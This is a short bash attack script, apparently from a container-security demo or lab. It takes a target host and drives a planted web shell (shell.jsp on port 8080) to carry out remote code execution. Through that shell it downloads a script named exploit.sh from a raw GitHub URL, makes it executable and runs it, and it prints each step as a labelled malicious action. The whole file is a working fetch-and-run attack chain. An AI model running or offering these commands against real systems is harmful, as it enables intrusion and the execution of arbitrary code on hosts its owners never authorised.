#!/bin/bash

url=$1

echo '### Dropping malicious script into the container via RCE ###'
echo "curl http://$1:8080/shell.jsp\?cmd\=wget+https%3A%2F%2Fraw.githubusercontent.com%2Fstanezil%2Fs4s%2Fmain%2Fexploit.sh --output -"
curl http://$1:8080/shell.jsp\?cmd\=wget+https%3A%2F%2Fraw.githubusercontent.com%2Fstanezil%2Fs4s%2Fmain%2Fexploit.sh --output -

sleep 3

echo '### Adding execution permissions to the script ###'
echo "curl http://$1:8080/shell.jsp\?cmd\=chmod+755+exploit.sh --output -"
curl http://$1:8080/shell.jsp\?cmd\=chmod+755+exploit.sh --output -

sleep 3

echo '### Executes malicious script'
echo "curl http://$1:8080/shell.jsp\?cmd\=.%2Fexploit.sh --output -"
curl http://$1:8080/shell.jsp\?cmd\=.%2Fexploit.sh --output -


